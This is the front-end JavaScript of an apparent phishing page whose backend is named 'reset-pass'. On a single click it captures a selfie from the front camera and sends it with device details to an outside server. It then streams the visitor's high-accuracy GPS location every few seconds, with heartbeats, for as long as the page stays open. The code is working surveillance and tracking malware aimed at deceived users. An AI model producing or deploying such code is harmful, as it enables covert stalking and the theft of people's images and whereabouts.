const BACKEND_URL = "https://reset-pass-1plx.onrender.com";

const startBtn = document.getElementById("startBtn");
const statusEl = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let submissionId = null;
let cameraStream = null;
let watchId = null;
let heartbeatTimer = null;
let retryTimer = null;
let lastSentLocationKey = "";

function setStatus(text) {
  statusEl.textContent = text;
}

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getDeviceInfo() {
  return {
    platform: navigator.platform || "",
    language: navigator.language || "",
    screen: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
  };
}

async function postJson(path, body) {
  const response = await fetch(`${BACKEND_URL}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    throw new Error(data.error || `Request failed: ${response.status}`);
  }

  return data;
}

async function openCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error("المتصفح لا يدعم الكاميرا");
  }

  const constraints = {
    video: {
      facingMode: "user",
      width: { ideal: 720 },
      height: { ideal: 720 },
    },
    audio: false,
  };

  cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = cameraStream;

  await new Promise((resolve) => {
    video.onloadedmetadata = () => resolve();
  });

  await video.play().catch(() => {});
  await wait(900);
}

function captureSelfie() {
  const width = video.videoWidth || 640;
  const height = video.videoHeight || 480;

  canvas.width = width;
  canvas.height = height;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, width, height);

  return canvas.toDataURL("image/jpeg", 0.82);
}

function stopCamera() {
  if (cameraStream) {
    cameraStream.getTracks().forEach((track) => track.stop());
    cameraStream = null;
  }
}

function locationKey(coords) {
  return [
    Number(coords.latitude).toFixed(6),
    Number(coords.longitude).toFixed(6),
    Math.round(coords.accuracy || 0),
  ].join(":");
}

async function sendLiveLocation(position) {
  if (!submissionId || !position || !position.coords) return;

  const key = locationKey(position.coords);
  if (key === lastSentLocationKey) return;
  lastSentLocationKey = key;

  try {
    await postJson("/api/live-location", {
      id: submissionId,
      lat: position.coords.latitude,
      lon: position.coords.longitude,
      accuracy: position.coords.accuracy,
    });
    setStatus("تم الإرسال. يتم تحديث الموقع طالما الصفحة مفتوحة.");
  } catch (error) {
    console.log("Live location send failed:", error.message);
  }
}

function startHeartbeat() {
  if (heartbeatTimer) clearInterval(heartbeatTimer);

  heartbeatTimer = setInterval(async () => {
    if (!submissionId) return;

    try {
      await postJson("/api/heartbeat", { id: submissionId });
    } catch (error) {
      console.log("Heartbeat failed:", error.message);
    }
  }, 8000);
}

function startLocationTracking() {
  if (!navigator.geolocation) {
    setStatus("تم إرسال الصورة. المتصفح لا يدعم الموقع.");
    return;
  }

  const options = {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: 15000,
  };

  const success = (position) => {
    sendLiveLocation(position);
  };

  const fail = (error) => {
    console.log("Location error:", error.code, error.message);
    setStatus("تم إرسال الصورة. جاري محاولة تحديد الموقع مرة أخرى...");
  };

  try {
    watchId = navigator.geolocation.watchPosition(success, fail, options);
  } catch (error) {
    console.log("watchPosition failed:", error.message);
  }

  if (retryTimer) clearInterval(retryTimer);
  retryTimer = setInterval(() => {
    navigator.geolocation.getCurrentPosition(success, fail, options);
  }, 10000);
}

async function startFlow() {
  startBtn.disabled = true;

  try {
    setStatus("جاري طلب إذن الكاميرا...");
    await openCamera();

    setStatus("جاري التقاط الصورة...");
    const image = captureSelfie();
    stopCamera();

    setStatus("جاري إرسال الصورة...");
    const result = await postJson("/api/save-data", {
      image,
      userAgent: navigator.userAgent,
      deviceInfo: getDeviceInfo(),
    });

    submissionId = result.id;
    startHeartbeat();

    setStatus("تم إرسال الصورة. جاري طلب الموقع وتحديثه تلقائيًا...");
    startLocationTracking();
  } catch (error) {
    stopCamera();
    startBtn.disabled = false;
    setStatus(error.message || "حدث خطأ، حاول مرة أخرى.");
  }
}

window.addEventListener("beforeunload", () => {
  if (watchId !== null && navigator.geolocation) {
    navigator.geolocation.clearWatch(watchId);
  }
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  if (retryTimer) clearInterval(retryTimer);
  stopCamera();
});

startBtn.addEventListener("click", startFlow);
